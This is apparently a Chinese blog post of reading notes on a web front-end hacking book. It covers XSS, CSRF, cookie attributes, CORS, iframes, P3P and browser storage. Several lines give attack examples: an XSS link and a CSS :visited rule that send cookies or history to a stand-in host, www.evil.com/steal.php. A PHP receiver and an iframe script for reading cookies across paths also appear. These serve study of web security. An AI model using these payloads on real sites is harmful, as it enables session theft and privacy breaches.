---
title: 读《web前端黑客技术揭秘》
date:   2018/6/1
categories: 
    - 学习
    - 读书笔记 
---

XSS 跨站脚本攻击
如果攻击者构造出如下链接：
http://www.foo.com/info.html#new%20Image().src="http://www.evil.com/steal.php?c="+escape(document.cookie)
浏览器解释执行后，下面的语句：
eval(location.hash.substr(1));
会变为：
eval('new Image().src="http://www.evil.com/steal.php?c="+escape(document.
cookie)')
Cookies 会话信息就会被盗取到黑客的网站上

CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”
目标权限），然后去做坏事，
“盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。

APT（持久化威胁）攻击
如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。

HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？
这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发
送出去。Cookies 还可以包括登录认证后的身份信息。

Content-Type: text/html;charset=gbk
响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏
览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码
方式，同样可能带来安全问题。

Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030
00:00:00 GMT; path=/; domain=.foo.com
每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。
expires：过期时间，如果过期时间是过去，那就表明这个Cookie 要被删。
path：相对路径，只有这个路径下的资源可以访问这个Cookie。
domain：域名，不允许设为下一级子域或其他外域，可以指定为父级域
HttpOnly：标志（默认无，如果有的话，表明Cookie 存在于HTTP 层面，不能被客户
端脚本读取）。
Secure：标志（默认无，如果有的话，表明Cookie 仅通过HTTPS 协议进行安全传输）。但是Secure Cookie 对于客户端脚本来说是可读写的。可读意味着
Secure Cookie 能被盗取，可写意味着能被篡改。

### iframe
攻击者入侵一个网站后，可以通过iframe 嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行

当网站页面使用iframe 方式嵌入一个页面时，
我们约定网站页面是父页，而被嵌入的这个页面是子页。那么父页与子页之间如何跨文档读写数据？
如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow
来操作子页的DOM 树，同理，子页可以调用父页的contentWindow 来操作父页的DOM 树。
如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location 值进行写操作，
这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权
限，这样就不能获取到父页location URL 的内容，否则有可能会造成隐私数据泄漏，

### 跨域
 www.foo.com（来源域）的AJAX 向www.evil.com（目标域）发起了请求，浏览器会
给自动带上Origin 头，如下：
Origin: http://www.foo.com
然后目标域要判断这个Origin 值，如果是自己预期的，那么就返回：
Access-Control-Allow-Origin: http://www.foo.com
表示同意跨域

如果目标域不设置Access-Control-Allow-Origin: http://www.foo.com，那么隐私数据可
以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被
目标域的steal.php 接收到了。

### 跨域带上会话
默认情况下，跨域不会带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持），同时目标域的steal.php 必须设置如下：
<?php
header("Access-Control-Allow-Origin: http://www.foo.com");
header("Access-Control-Allow-Credentials: true"); // 允许跨域证书发送
//...
?>
有 一 点 需 要 注 意 ， 如 果设置了Access-Control-Allow-Credentials 为true ， 那么
Access-Control-Allow-Origin 就不能设置为*通配符

### 跨路径读取Cookie
那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行
DOM 操作即可，/evil/路径下页面的代码如下：
```javascript
xc = function(src){
var o = document.createElement("iframe"); // iframe 进入同域的目标页面
o.src = src;
document.getElementsByTagName("body")[0].appendChild(o);
o.onload = function(){ // iframe 加载完成后
d = o.contentDocument || o.contentWindow.document;
// 获取document 对象
alert(d.cookie); // 获取cookie
};
}('http://a.foo.com/admin/index.php');
```
所以，通过设置path 不能防止重要的Cookie 被盗取。

### 本地Cookie 与内存Cookie
如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了
过期时间是未来的某个时间点，那么这样的Cookie 就会以文本形式保存在操作系统本地，
待过期时间到了才会消失。

### P3P
HTTP 响应头的P3P（Platform for Privacy Preferences Project）字段是W3C 公布的一项
隐私保护推荐标准。该字段用于标识是否允许目标网站的Cookie 被另一个域通过加载目标
网站而设置或发送，仅IE 执行了该策略。
比如，evil 域通过script 或iframe 等方式加载foo 域（此时foo 域被称为第三方域）。
加载的时候，有两种场景

1. 浏览器是否会允许foo 域设置自己的Cookie

    在IE 下默认都是不允许第三方域设置域已有的Cookie的，除非foo 域在``响应的时候带上P3P 字段``

2. 浏览器是否允许发送请求到foo 域时，带上foo 域已有的Cookie

    发送的Cookie 如果是内存Cookie，则无所谓是否有P3P 属性，就可以正常发送；如果
    是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头
    也没用。
### IE的userData
 ```javascript
 function set_ud(key,value) {
    var a = document.getElementById('x'); // x 为任意div 的id 值
    a.addBehavior("#default#userdata");
    a.setAttribute(key,value);
    a.save("db");
}
function get_ud(key) {
    var a = document.getElementById('x');
    a.addBehavior("#default#userdata");
    a.load("db");
    alert(a.getAttribute(key));
}
function del_ud(key) {
    var a = document.getElementById('x');
    a.addBehavior("#default#userdata");
    a.setAttribute(key, ""); // 设置为空值即可
    a.save("db");
}
window.onload = function(){
    set_ud('a','xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'); // 设置
    get_ud('a'); // 获取a 的值
    del_ud('a'); // 删除a 的值
    get_ud('a'); // 获取a 的值
};
 ```
### FlashCookie
```actionScript
function set_lso(k:String="default", v:String=""):void
{ // 设置值
    var shared:SharedObject = SharedObject.getLocal("db");
    shared.data[k] = v;
    shared.flush();
}
function get_lso(k:String="default"):String
{ // 获取值
    var str:String = "";
    var shared:SharedObject = SharedObject.getLocal("db");
    str = shared.data[k];
    return str;
}
function clear_lso():void
{ // 清空值
    var shared:SharedObject = SharedObject.getLocal("db");
    shared.clear();
}
```

### 函数劫持很简单
一般情况下，只要在目标函数触发之前，重写这个函数即可

### css
```css
#a2:visited {background: url(http://www.evil.com/css/steal.php?data=a2);}
```